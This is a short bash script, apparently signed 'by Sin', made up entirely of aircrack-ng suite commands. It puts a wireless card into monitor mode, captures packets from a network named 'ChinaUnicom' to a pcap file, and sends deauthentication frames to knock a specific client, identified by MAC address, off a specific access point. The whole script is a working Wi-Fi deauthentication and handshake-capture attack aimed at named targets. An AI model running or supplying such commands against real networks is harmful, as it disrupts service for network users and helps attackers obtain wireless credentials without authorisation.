#!/bin/bash
#by Sin
airmon-ng start wlan0
airodump-ng --essid ChinaUnicom --channel 1 mon0 --showack --output-format pcap -c 100000 -w wifi.pcap
aireplay-ng --deauth 5 -a 4C:AC:0A:34:FB:46 -c 9C:B6:D0:05:58:6B mon0 --ignore-negative-one -e ChinaUnicom

